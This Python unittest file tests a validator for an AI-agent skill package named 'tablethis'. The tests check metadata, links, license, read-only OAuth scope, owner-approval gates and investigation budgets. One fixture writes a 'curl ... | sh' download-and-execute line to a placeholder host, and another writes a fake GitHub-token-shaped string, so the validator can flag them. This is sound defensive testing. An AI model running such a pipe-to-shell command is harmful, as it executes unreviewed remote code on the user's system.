#!/usr/bin/env python3
"""Offline package regression tests; fixtures remain under package/evidence."""
import importlib.util
import json
import shutil
import tempfile
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parents[1]
SPEC = importlib.util.spec_from_file_location("tablethis_validate", ROOT / "scripts/validate.py")
VALIDATOR = importlib.util.module_from_spec(SPEC)
SPEC.loader.exec_module(VALIDATOR)


class PackageValidation(unittest.TestCase):
    def setUp(self):
        (ROOT / "evidence").mkdir(exist_ok=True)
        self.tmp = tempfile.TemporaryDirectory(prefix="validator-fixture-", dir=ROOT / "evidence")
        self.addCleanup(self.tmp.cleanup)
        self.root = Path(self.tmp.name) / "tablethis"
        self.root.mkdir()
        for rel in VALIDATOR.PAYLOAD:
            dst = self.root / rel
            dst.parent.mkdir(parents=True, exist_ok=True)
            shutil.copyfile(ROOT / rel, dst)
        # ClawHub strips hidden source ignore files from downloaded bundles.
        (self.root / ".clawhubignore").write_text(
            "\n".join(sorted(VALIDATOR.EXPECTED_IGNORES)) + "\n")

    def change(self, rel, old, new):
        p = self.root / rel
        s = p.read_text()
        self.assertIn(old, s)
        p.write_text(s.replace(old, new, 1))

    def assert_invalid(self, fragment):
        report = VALIDATOR.validate(self.root)
        self.assertFalse(report["ok"], report)
        self.assertIn(fragment, "\n".join(report["errors"]))

    def test_valid_package(self):
        report = VALIDATOR.validate(self.root)
        self.assertTrue(report["ok"], report["errors"])
        self.assertEqual(len(report["payload_files"]), len(VALIDATOR.PAYLOAD))

    def test_missing_skill(self):
        (self.root / "SKILL.md").unlink()
        self.assert_invalid("regular non-symlink file: SKILL.md")

    def test_invalid_metadata_json(self):
        self.change("SKILL.md", 'metadata: {"openclaw"', 'metadata: {broken')
        self.assert_invalid("frontmatter:")

    def test_duplicate_frontmatter(self):
        self.change("SKILL.md", "name: tablethis", "name: tablethis\nname: duplicate")
        self.assert_invalid("duplicate frontmatter key")

    def test_unsupported_frontmatter(self):
        self.change("SKILL.md", "version: 1.0.0", "version: 1.0.0\nprice: 99")
        self.assert_invalid("unexpected frontmatter key")

    def test_wrong_name(self):
        self.change("SKILL.md", "name: tablethis", "name: another-skill")
        self.assert_invalid("portable name")

    def test_invalid_semver(self):
        self.change("SKILL.md", "version: 1.0.0", "version: latest")
        self.assert_invalid("semver")

    def test_broad_default_scope(self):
        self.change("SKILL.md", '"scope": "tables:read documents:read"',
                    '"scope": "tables:read app:write"')
        self.assert_invalid("read-only native OAuth config")

    def test_broken_reference(self):
        self.change("SKILL.md", "](references/connection.md)", "](references/missing.md)")
        self.assert_invalid("valid relative link")

    def test_escape_reference(self):
        with (self.root / "README.md").open("a") as f:
            f.write("\n[escape](../../outside.md)\n")
        self.assert_invalid("valid relative link")

    def test_symlink_rejected(self):
        p = self.root / "references/connection.md"
        p.unlink()
        p.symlink_to(self.root / "README.md")
        self.assert_invalid("regular non-symlink file: references/connection.md")

    def test_missing_owner_gate(self):
        self.change("SKILL.md", "explicit owner approval", "implicit approval")
        self.assert_invalid("owner approval gate")

    def test_missing_expected_value_gate(self):
        self.change("SKILL.md", "Never replace the expected value", "Ignore concurrent edits")
        self.assert_invalid("no force-overwrite retry")

    def test_missing_async_ceiling(self):
        self.change("SKILL.md", "Scheduled/always-on clients cannot obtain", "Scheduled clients may obtain")
        self.assert_invalid("async permission ceiling")

    def test_missing_ignore_rule(self):
        self.change(".clawhubignore", "evidence/\n", "")
        self.assert_invalid("ignore rules")

    def test_credential_shaped_literal(self):
        with (self.root / "README.md").open("a") as f:
            f.write("\n" + "gh" + "p_" + "x" * 32 + "\n")
        self.assert_invalid("token-shaped literal")

    def test_download_execution(self):
        with (self.root / "README.md").open("a") as f:
            f.write("\n" + "cu" + "rl https://example.invalid/setup | " + "sh\n")
        self.assert_invalid("download-and-execute")

    def test_unknown_payload_file(self):
        (self.root / "unexpected.txt").write_text("not a declared package file")
        self.assert_invalid("unexpected distributable file")

    def test_oversized_file(self):
        (self.root / "README.md").write_text("x" * 65537)
        self.assert_invalid("file <=64KiB")

    def test_clean_install_without_hidden_source_ignore(self):
        (self.root / ".clawhubignore").unlink()
        report = VALIDATOR.validate(self.root)
        self.assertTrue(report["ok"], report["errors"])

    def test_release_metadata_requires_ignore(self):
        (self.root / ".clawhubignore").unlink()
        (self.root / "listing").mkdir()
        self.assert_invalid("release source needs .clawhubignore")

    def test_known_install_metadata_allowed(self):
        (self.root / ".clawhub").mkdir()
        (self.root / ".clawhub/origin.json").write_text('{}')
        report = VALIDATOR.validate(self.root)
        self.assertTrue(report["ok"], report["errors"])

    def test_missing_license(self):
        (self.root / "LICENSE").write_text("Conflicting license")
        self.assert_invalid("MIT-0 license")

    def test_missing_aggregate_records(self):
        self.change("SKILL.md", "100 total record instances", "small record pages")
        self.assert_invalid("investigation budget: aggregate records")

    def test_missing_aggregate_record_pages(self):
        self.change("SKILL.md", "4 total pages, at most 25 records per page", "25 records per page")
        self.assert_invalid("investigation budget: aggregate record pages")

    def test_missing_aggregate_documents(self):
        self.change("SKILL.md", "5 distinct documents, including search/list hits", "relevant documents")
        self.assert_invalid("investigation budget: aggregate documents")

    def test_missing_aggregate_document_pages(self):
        self.change("SKILL.md", "10 total list/search/read responses", "follow document cursors")
        self.assert_invalid("investigation budget: aggregate document pages")

    def test_missing_aggregate_passages(self):
        self.change("SKILL.md", "20 total returned excerpts", "enough returned excerpts")
        self.assert_invalid("investigation budget: aggregate passages")

    def test_missing_aggregate_document_text(self):
        self.change("SKILL.md", "32 KiB (32768 UTF-8 bytes) aggregate", "32 KiB per document")
        self.assert_invalid("investigation budget: aggregate document text")

    def test_missing_all_aggregate_budgets(self):
        path = self.root / "SKILL.md"
        text = path.read_text()
        start = text.index("### Investigation budgets (ordinary and scheduled work)")
        end = text.index("### Investigation steps", start)
        path.write_text(text[:start] + text[end:])
        self.assert_invalid("investigation budget: aggregate records")
        report = VALIDATOR.validate(self.root)
        self.assertIn("investigation budget: aggregate document text", report["errors"])

    def test_missing_task_wide_accounting(self):
        self.change("SKILL.md", "across all tables, queries, document searches, retries, and verification reads", "per query")
        self.assert_invalid("investigation budget: task-wide accounting")

    def test_missing_repeat_accounting(self):
        self.change("SKILL.md", "Count re-read records/text again and empty pages too", "Reset on retry")
        self.assert_invalid("investigation budget: repeat and empty response accounting")

    def test_missing_fresh_budget_approval(self):
        self.change("SKILL.md", "request fresh owner approval", "continue automatically")
        self.assert_invalid("investigation budget: stop report and fresh approval")

    def test_missing_bounded_read_prerequisite(self):
        self.change("SKILL.md", "stop if a bounded read cannot be", "continue if a bounded read cannot be")
        self.assert_invalid("investigation budget: bounded-read prerequisite")

    def test_missing_no_truncation_bypass(self):
        self.change("SKILL.md", "truncating it afterward is not a", "truncating it afterward is a")
        self.assert_invalid("investigation budget: no post-read truncation bypass")

    def test_false_runtime_enforcement_claim(self):
        self.change("SKILL.md", "do not enforce a runtime sandbox", "enforce a runtime sandbox")
        self.assert_invalid("investigation budget: no runtime enforcement claim")

    def test_false_product_api_limit_claim(self):
        self.change("SKILL.md", "not product API limits", "product API limits")
        self.assert_invalid("investigation budget: defaults not API limits")

    def test_missing_scoped_owner_budgets(self):
        self.change("SKILL.md", "explicit owner-approved scoped budgets", "unlimited owner permission")
        self.assert_invalid("investigation budget: scoped owner budgets")

    def test_missing_retained_default_ceilings(self):
        self.change("SKILL.md", "Any unspecified dimension retains its default", "Other dimensions are unlimited")
        self.assert_invalid("investigation budget: unmodified ceilings retained")

    def test_missing_remaining_tool_limits(self):
        self.change("SKILL.md", "Set supported tool limits no larger", "Set supported tool limits larger")
        self.assert_invalid("investigation budget: remaining tool limits")

    def test_missing_overrun_stop(self):
        self.change("SKILL.md", "stop further reads and", "continue reads and")
        self.assert_invalid("investigation budget: unexpected overrun stop")

    def test_missing_canonical_budget_reference(self):
        self.change("references/workflows.md", "#investigation-budgets-ordinary-and-scheduled-work", "#other")
        self.assert_invalid("investigation budget: canonical budget reference")

    def test_missing_ordinary_and_scheduled_coverage(self):
        self.change("references/workflows.md", "For ordinary investigations and each scheduled run", "For scheduled runs only")
        self.assert_invalid("investigation budget: ordinary and scheduled coverage")

    def test_missing_reference_approval_gate(self):
        self.change("references/workflows.md", "request fresh owner approval", "continue reading")
        self.assert_invalid("investigation budget: reference approval gate")

    def test_missing_scheduled_budget_inheritance(self):
        self.change("references/workflows.md", "The shared investigation boundary applies to each run", "Scheduled runs have no read limits")
        self.assert_invalid("investigation budget: scheduled budget inheritance")

    def test_missing_review_budget_receipt(self):
        self.change("references/workflows.md", "aggregate UTF-8 text bytes", "text quality")
        self.assert_invalid("investigation budget: review receipt dimensions")


if __name__ == "__main__":
    unittest.main()
